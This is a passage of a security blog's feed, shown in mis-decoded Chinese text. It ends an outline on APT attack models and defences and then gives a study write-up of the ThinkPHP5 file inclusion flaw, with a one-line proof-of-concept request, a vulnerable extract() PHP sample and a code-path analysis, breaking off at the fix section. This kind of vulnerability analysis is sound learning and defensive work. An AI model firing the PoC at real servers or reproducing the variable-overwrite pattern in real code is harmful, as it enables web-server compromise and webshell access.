Offier)</li></ul></li></ul></li><li><p>å¨èƒæƒ…æŠ¥çš„åˆ©ç”¨</p><ul><li><p>~åœ¨å‡†å¤‡é˜¶æ®µã€æ£€æµ‹ä¸åˆ†æé˜¶æ®µã€éš”ç¦»ï¼Œæ¸…é™¤ï¼Œä¸æ¢å¤é˜¶æ®µã€äº‹åå¤ç›˜é˜¶æ®µçš„ä½œç”¨</p></li><li><p>å®‰å…¨è¿è¥å›¢é˜Ÿä¼šé‡åˆ°çš„é—®é¢˜</p><ul><li>å¦‚ä½•é«˜æ•ˆåœ°å‘ç°æ”»å‡»å’Œå…¥ä¾µæ´»åŠ¨ï¼Œè¯„ä¼°å½±å“é¢</li><li>å¦‚ä½•è·å–ã€å¤„ç½®ä¸å·²ç»å‘ç°å®‰å…¨äº‹ä»¶ç›¸å…³çš„æ´»åŠ¨</li><li>å¦‚ä½•åŸºäºå¯¹å¯¹æ‰‹çš„äº†è§£ã€è®¾ç½®å„ä¸ªç¯èŠ‚ä¸Šçš„å®‰å…¨æ§åˆ¶æªæ–½ã€ä»¥é˜»æ­¢ç›¸åŒå¯¹æ‰‹æˆ–ç±»ä¼¼æ”»å‡»æ‰‹æ³•çš„å…¥ä¾µ</li><li>ç†è§£ç›®å‰å®‰å…¨å¨èƒçš„å…¨è²Œã€å®ç°æœ‰æ•ˆçš„å®‰å…¨æŠ•èµ„</li></ul></li></ul></li></ul></li><li><p>æµé‡å¨èƒæ£€æµ‹æŠ€æœ¯</p><ul><li>æµé‡å¨èƒåˆ†æ</li><li>æµé‡æ—¥å¿—å­˜å‚¨</li><li>å¨èƒå›æº¯åˆ†æ</li></ul></li><li><p>ç½‘ç»œæ£€æµ‹å“åº”æŠ€æœ¯(Network-based Detection and Response,NDR)</p></li><li><p>ç»ˆç«¯æ£€æµ‹å“åº”æŠ€æœ¯(Endpoint Detection and Response,EDR)</p><ul><li>åŸºäºç»ˆç«¯å¤§æ•°æ®åˆ†æçš„æ–°ä¸€ä»£ç»ˆç«¯å®‰å…¨äº§å“ï¼Œèƒ½å¯¹ç»ˆç«¯è¡Œä¸ºæ•°æ®è¿›è¡Œå…¨é¢é‡‡é›†ã€å®æ—¶ä¸Šä¼ ã€å¯¹ç»ˆç«¯è¿›è¡ŒæŒç»­æ£€æµ‹å’Œåˆ†æã€å¢å¼ºå¯¹å†…éƒ¨å¨èƒäº‹ä»¶çš„æ·±åº¦å¯è§æ€§ï¼Œç»“åˆç›¸å…³å¨èƒæƒ…æŠ¥ä¸­å¿ƒæ¨é€çš„æƒ…æŠ¥ä¿¡æ¯(IPã€URLã€æ–‡ä»¶Hashç­‰)èƒ½å¸®åŠ©ä¼ä¸šå¿«é€Ÿå‘ç°ï¼Œç²¾ç¡®å®šä½é«˜çº§å¨èƒå…¥ä¾µ</li></ul></li></ul><h3 id="å¦‚ä½•åˆ†æAPTæ”»å‡»"><a href="#å¦‚ä½•åˆ†æAPTæ”»å‡»" class="headerlink" title="å¦‚ä½•åˆ†æAPTæ”»å‡»"></a>å¦‚ä½•åˆ†æAPTæ”»å‡»</h3><ul><li><p>ç½‘ç»œæ€ä¼¤é“¾æ¨¡å‹(Cyber Kill Chain)</p><ul><li><p>ä¾¦å¯Ÿ</p><ul><li>æ”»å‡»è€…é€‰æ‹©ç›®æ ‡ã€è¿›è¡Œç ”ç©¶ã€æœé›†ç›®æ ‡å¼±ç‚¹</li></ul></li><li><p>æ­¦å™¨åŒ–</p><ul><li>æ”»å‡»è€…åˆ›å»ºé’ˆå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªæ¼æ´å®šåˆ¶çš„è¿œç¨‹è®¿é—®æ¶æ„ç¨‹åºæ­¦å™¨ï¼Œæ¯”å¦‚ç—…æ¯’æˆ–è •è™«</li></ul></li><li><p>æ•£å¸ƒ</p><ul><li>å°†ç½‘ç»œæ­¦å™¨åŒ…å‘ç›®æ ‡æŠ•æ”¾</li></ul></li><li><p>æ¶ç”¨</p><ul><li>åœ¨å—å®³è€…ç³»ç»Ÿä¸Šè¿è¡Œä»£ç </li></ul></li><li><p>è®¾ç½®</p><ul><li>åœ¨ç›®æ ‡ä½ç½®å®‰è£…æ¶æ„ç¨‹åº</li></ul></li><li><p>å‘½ä»¤å’Œæ§åˆ¶</p><ul><li>ä¸ºæ”»å‡»è€…å»ºç«‹å¯è¿œç¨‹æ§åˆ¶ç›®æ ‡ç³»ç»Ÿçš„è·¯å¾„</li></ul></li><li><p>ç›®æ ‡è¾¾æˆ</p><ul><li>æ”»å‡»è€…è¿œç¨‹å®Œæˆå…¶é¢„æœŸæ•ˆæœ</li></ul></li></ul></li><li><p>é’»çŸ³æ¨¡å‹</p><ul><li><p>æ”»å‡»è€…</p><ul><li>åˆ†æ¸…æ”»å‡»è€…æœ‰åˆ©ç”¨äº†è§£å…¶ç›®çš„ã€å½’å±ã€é€‚åº”æ€§å’ŒæŒä¹…æ€§</li></ul></li><li><p>èƒ½åŠ›</p><ul><li>äº‹ä»¶ä¸­ä½¿ç”¨çš„å·¥å…·æˆ–æŠ€æœ¯</li></ul></li><li><p>åŸºç¡€è®¾æ–½</p><ul><li>æ”»å‡»è€…ç”¨æ¥ä¼ é€’èƒ½åŠ›çš„ç‰©ç†æˆ–é€»è¾‘ç»“æ„ï¼Œå¦‚IPåœ°å€ã€åŸŸåã€é‚®ä»¶åœ°å€ã€USBè®¾å¤‡ç­‰</li></ul></li><li><p>å—å®³è€…</p><ul><li>ä»¥ç¤¾ä¼š-æ”¿æ²»ä¸ºæ”¯ç‚¹çš„å®‰å…¨åˆ†æä¸­ï¼Œå—å®³è€…ä½œç”¨é‡å¤§</li></ul></li></ul></li><li><p>è‡ªé€‚åº”å®‰å…¨æ¶æ„(Adaptive Security Architecture,ASA)</p><ul><li>ç”±ç¾å›½å®‰å…¨å…¬å¸Gartneräº2014å¹´æå‡ºçš„é¢å‘æœªæ¥çš„ä¸‹ä¸€ä»£å®‰å…¨æ¶æ„ï¼Œä»é¢„æµ‹ã€é˜²å¾¡ã€æ£€æµ‹ã€å“åº”å››ä¸ªç»´åº¦ï¼Œå¼ºåº¦å®‰å…¨é˜²æŠ¤æ˜¯ä¸€ä¸ªæŒç»­å¤„ç†ã€å¾ªç¯çš„è¿‡ç¨‹ï¼Œæ˜¯ç»†ç²’åº¦ã€å¤šè§’åº¦ã€æŒç»­åŒ–åœ°å¯¹å®‰å…¨å¨èƒè¿›è¡Œå®æ—¶åŠ¨æ€åˆ†æ</li><li>ç›®çš„ï¼šä¸ºäº†è§£å†³å½“å‰ä¼ä¸šçš„å®‰å…¨é˜²æŠ¤åŠŸèƒ½éš¾ä»¥åº”å¯¹é«˜çº§å®šå‘æ”»å‡»çš„é—®é¢˜</li><li>æœ€ç»ˆæ•ˆæœï¼šè¾¾åˆ°ç½‘ç»œå®‰å…¨çš„å¯ç®¡ã€å¯æ§ã€å¯è§†ã€å¯è°ƒåº¦ã€å¯æŒç»­</li></ul></li></ul><h3 id="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"><a href="#ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»" class="headerlink" title="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"></a>ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»</h3><ul><li><p>é«˜çº§å®‰å…¨å¨èƒçš„åˆ¤å®š</p><ul><li>ç»“åˆå¤šæºå¤´å¨èƒæƒ…æŠ¥åº”ç”¨ã€æ²™ç®±åŠ¨æ€è¡Œä¸ºå‘ç°ã€å…³è”å¼•æ“åˆ†æ</li></ul></li><li><p>å®‰å…¨å¨èƒçš„å¤„ç½®</p><ul><li>NDRä¸EDRè”åŠ¨</li></ul></li></ul><h2 id="APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿"><a href="#APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿" class="headerlink" title="APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)"></a>APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)</h2><h3 id="æŠ€æœ¯è¶Šå‘é«˜è¶…"><a href="#æŠ€æœ¯è¶Šå‘é«˜è¶…" class="headerlink" title="æŠ€æœ¯è¶Šå‘é«˜è¶…"></a>æŠ€æœ¯è¶Šå‘é«˜è¶…</h3><ul><li><p>éPEæ–‡ä»¶æ–‡ä»¶æ”»å‡»</p><ul><li>æ–‡ä»¶æ— éœ€é•¿æœŸé©»ç•™ç£ç›˜</li><li>æ ¸å¿ƒPayloadå­˜æ”¾åœ¨ç½‘ç»œæˆ–æ³¨å†Œè¡¨</li><li>é€šè¿‡ç³»ç»Ÿè¿›ç¨‹æ‰§è¡ŒPayload</li></ul></li><li><p>å¼€æºå·¥å…·å’Œè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p><ul><li><p>PowerShellè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>â€œLiving off the landâ€æŠ€æœ¯</p></li></ul><h3 id="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"><a href="#å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ" class="headerlink" title="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"></a>å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ</h3><ul><li>èƒ½æºèµ„æºã€å·¥ä¸šã€æŒæœ‰ä¸åŒæ”¿è§è€…</li><li>è¿™ç±»APTç»„ç»‡ï¼šé»„é‡‘é¼ ã€äººé¢ç‹®ã€APT33ã€APT34ç­‰</li></ul><h3 id="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"><a href="#ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº" class="headerlink" title="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"></a>ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº</h3><ul><li>å½±å“é¢ï¼šæ”¿æ²»ã€ç»æµã€å†›äº‹è°ˆåˆ¤ç­‰</li></ul><h3 id="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"><a href="#é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ" class="headerlink" title="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"></a>é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ</h3><ul><li>â€œäº’è”ç½‘+â€ã€5Gã€ä¸‡ç‰©äº’è”ç­‰æ–°å…´æŠ€æœ¯çš„å…´èµ·</li><li>æ¶‰åŠè¡Œä¸šï¼šèƒ½æºã€äº¤é€šã€åˆ¶é€ ã€é‡‘èã€é€šä¿¡ç­‰é¢†åŸŸ</li><li>ç°çŠ¶ï¼šå¾ˆå¤šåŸºç¡€è®¾æ–½å’Œç”Ÿäº§ç³»ç»Ÿçš„ç½‘ç»œå®‰å…¨ä½“ç³»å»ºè®¾è¿˜åŸºæœ¬ä¸ºé›¶</li></ul><h3 id="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ "><a href="#é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ " class="headerlink" title="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ "></a>é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ </h3><ul><li>iOSã€Android</li><li>ç³»ç»Ÿæ¼æ´ã€ç¤¾ä¼šå·¥ç¨‹å­¦</li><li>å…¸å‹ä¾‹å­ï¼šâ€œä¸‰å‰æˆŸæ¼æ´â€</li></ul><h2 id="å…¸å‹çš„APTç»„ç»‡æœºæ„"><a href="#å…¸å‹çš„APTç»„ç»‡æœºæ„" class="headerlink" title="å…¸å‹çš„APTç»„ç»‡æœºæ„"></a>å…¸å‹çš„APTç»„ç»‡æœºæ„</h2><h3 id="æ–¹ç¨‹å¼"><a href="#æ–¹ç¨‹å¼" class="headerlink" title="æ–¹ç¨‹å¼"></a>æ–¹ç¨‹å¼</h3><h3 id="ç´¢ä¼¦ä¹‹çœ¼"><a href="#ç´¢ä¼¦ä¹‹çœ¼" class="headerlink" title="ç´¢ä¼¦ä¹‹çœ¼"></a>ç´¢ä¼¦ä¹‹çœ¼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"><a href="#å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚" class="headerlink" title="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"></a>å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ã€Šé€è§†APTã€‹&quot;&gt;&lt;a href=&quot;#ã€Šé€è§†APTã€‹&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -æ–‡ä»¶åŒ…å«æ¼æ´</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2021-05-25T09:50:01.097Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"></a>ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>å¯é…åˆæ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬ï¼ŒGetShellã€‚(PHP æ–‡ä»¶åŒ…å«éƒ½è®²æ–‡ä»¶å½“åšphpåç¼€æ–‡ä»¶è¿›è¡Œè§£æï¼Œä¸å®é™…æ–‡ä»¶ç±»å‹æ— å…³)</p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> æ¨¡æ¿å¼•æ“ä¸­ï¼Œåœ¨åŠ è½½æ¨¡ç‰ˆè§£æå˜é‡æ—¶å­˜åœ¨<strong>å˜é‡è¦†ç›–</strong>é—®é¢˜ï¼Œè€Œä¸”ç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><ul><li>å˜é‡è¦†ç›–æ¼æ´</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>å¦‚æœæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITEã€‚</strong></p><p>ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)ï¼›</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è¿™ç§æƒ…å†µæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITE</strong></p><p>å‡è®¾ç”¨æˆ·æ„é€ ä»¥ä¸‹é“¾æ¥ï¼š<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>ç•Œé¢ä¸Šä¼šæ‰“å°å‡ºprivateï¼</p><p>å®‰å…¨çš„åšæ³•æ˜¯ç¡®å®šregister_globals=OFFåï¼Œåœ¨è°ƒç”¨extract()æ—¶ä½¿ç”¨EXTR_SKIPä¿è¯å·²æœ‰å˜é‡ä¸ä¼šè¢«è¦†ç›–ã€‚<br>ps:<br>PHP extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œä»¥<code>ThinkPHP 5.0.18</code>  è¿›è¡Œåˆ†æã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>åœ¨å†å²<code>Releases</code> ä¿¡æ¯ä¸­ï¼Œæ‰¾åˆ°äº† <code>5.0.19</code> ä¸­ï¼Œæ”¹è¿›äº† æ¨¡æ¿å¼•æ“çš„ä¸€å¤„å¯èƒ½çš„å®‰å…¨éšæ‚£ã€‚</p><p><code>/library/think/template/driver/File.php</code> ä¸­çš„ <code>File</code> ç±»ä¸­çš„<code>read</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>ç”¨æˆ·Getæäº¤çš„æ•°æ®éƒ½ä¼šé€šè¿‡<code>input</code> æ–¹æ³•è·å–æ•°æ®ï¼Œç„¶åé€šè¿‡<code>filterValue</code> æ–¹æ³•è¿›è¡Œè¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚</li><li>åœ¨ä¿®æ”¹åçš„ä»£ç ä¸‹æ–­ç‚¹ï¼Œç„¶åçœ‹æ–¹æ³•è°ƒç”¨å’Œå‚æ•°ä¼ é€’ã€‚å¦‚ä¸‹å›¾ï¼š</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>åœ¨<code>../application/index/index/controller/index.php</code> ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«<code>get</code>æ–¹æ³•è·å–ï¼Œç„¶åè°ƒç”¨äº†<code>input</code>æ–¹æ³•å’Œé€’å½’è°ƒç”¨<code>filterValue</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•è¿˜ä¼šç»§ç»­è°ƒç”¨<code>filterExp</code> æ–¹æ³•å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åè¿”å›ç»™<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>ç„¶åå†è°ƒç”¨<code>assign</code> æ–¹æ³•ï¼Œè¿”å›å¤„ç†åçš„æ•°æ®ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>å› æ­¤ç”¨æˆ·çš„æ•°æ®è¾“å…¥ï¼Œç»è¿‡<code>get</code>æ–¹æ³•å’Œ<code>assign</code>æ–¹æ³•åï¼Œè¿”å›çš„å†…å®¹ä¸º<code>cacheFile=favico.ico</code> ï¼Œç„¶åç¨‹åºç»§ç»­è°ƒç”¨<code>fetch</code>æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚</p><blockquote><p>fetchæ–¹æ³•ç”¨äºåŠ è½½æ¨¡æ¿è¾“å‡ºã€‚è¿™é‡Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šæ¨¡æ¿åç§°ï¼Œå…¶ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶ä½œä¸ºæ¨¡æ¿ï¼Œæ¨¡æ¿è·¯å¾„ç±»ä¼¼ <strong>å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</strong> ï¼Œå¦‚æœé»˜è®¤è·¯å¾„æ¨¡æ¿ä¸å­˜åœ¨ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>è·Ÿè¿›åˆ° <strong>Template</strong> ç±»çš„ <strong>fetch</strong> æ–¹æ³•ï¼Œå¯ä»¥å‘ç°å¯æ§å˜é‡ <strong>$vars</strong> èµ‹å€¼ç»™ <strong>$this-&gt;data</strong> å¹¶æœ€ç»ˆä¼ å…¥ <strong>File</strong> ç±»çš„ <strong>read</strong> æ–¹æ³•ã€‚è€Œ <strong>read</strong> æ–¹æ³•ä¸­åœ¨ä½¿ç”¨äº† <strong>extract</strong> å‡½æ•°åï¼Œç›´æ¥åŒ…å«äº† <strong>$cacheFile</strong> å˜é‡ã€‚è¿™é‡Œå°±æ˜¯æ¼æ´å‘ç”Ÿçš„å…³é”®åŸå› ï¼ˆå¯ä»¥é€šè¿‡ <strong>extract</strong> å‡½æ•°ï¼Œç›´æ¥è¦†ç›– <strong>$cacheFile</strong> å˜é‡ï¼Œå› ä¸º <strong>extract</strong> å‡½æ•°ä¸­çš„å‚æ•° <strong>$vars</strong> å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>æ–¹æ³•è°ƒç”¨æ ˆï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img 